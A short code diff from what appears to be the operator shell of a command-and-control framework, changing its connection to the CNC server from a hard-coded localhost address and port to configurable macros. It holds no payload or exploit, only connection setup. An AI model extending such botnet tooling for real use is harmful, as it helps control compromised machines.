@@ -58,7 +58,7 @@ int main(int argv, char *argc[]) {
     if (!loadConfig(&client, configFile))
         return 1;
 
-    shellC_connectToCNC(&client, "127.0.0.1", "13337");
+    shellC_connectToCNC(&client, LAIKA_CNC_IP, LAIKA_CNC_PORT);
 
     shellT_conioTerm();
     while(laikaS_isAlive((&client.peer->sock))) {
